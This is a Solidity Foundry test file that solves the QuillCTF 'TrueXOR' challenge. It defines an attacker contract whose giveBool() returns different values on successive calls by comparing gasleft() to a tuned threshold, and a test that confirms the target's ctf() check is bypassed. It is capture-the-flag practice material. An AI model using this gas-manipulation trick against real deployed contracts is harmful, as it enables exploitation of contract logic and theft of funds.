// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8;

import "forge-std/Test.sol";
import {TrueXOR, IBoolGiver} from "../../src/QuillCTF/TrueXOR/TrueXOR.sol";

contract TrueXORAttacker is IBoolGiver {
    uint public threshold = 1040412000;
    function giveBool() external view override returns (bool) {
        uint gasLeft = gasleft();

        console.log(gasLeft); // 1040414411  | 1040408946
        return gasLeft < threshold;
    }
}

contract TrueXORTest is Test {
    TrueXOR public trueXOR;
    TrueXORAttacker public trueXORAttacker;
    address public deployer;

    function setUp() public {
        deployer = vm.addr(1);
        vm.startPrank(deployer);

        trueXOR = new TrueXOR();
        trueXORAttacker = new TrueXORAttacker();

        vm.stopPrank();
    }

    function testCallCTF() public {
        vm.startPrank(deployer, deployer);
        bool res = trueXOR.ctf(address(trueXORAttacker));

        assertEq(res, true);

        vm.stopPrank();
    }
}
